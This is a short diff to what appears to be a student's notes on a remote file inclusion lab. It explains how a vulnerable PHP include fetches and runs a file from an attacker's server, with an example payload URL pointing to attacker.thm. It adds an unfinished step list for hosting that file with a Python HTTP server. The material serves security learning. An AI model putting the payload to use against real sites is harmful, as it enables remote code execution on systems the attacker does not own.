@@ -14,4 +14,11 @@ The risk is higher than LFI since RFI vulns allow an attacker to gain RCE on the
 
 First, the attacker injects the malicious URL, which points to the attacker's server, such as http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt. If there is no input validation, then the malicious URL passes into the include function. Next, the web app server will send a GET request to the malicious server to fetch the file. As a result, the web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker. In our case, the current page somewhere has to show the Hello THM message.
 
-Test
+
+
+1. python3 -m http.server 8000
+2. make file
+3. http://10.0.2.15:8000/hostname.txt
+4. 
+
+
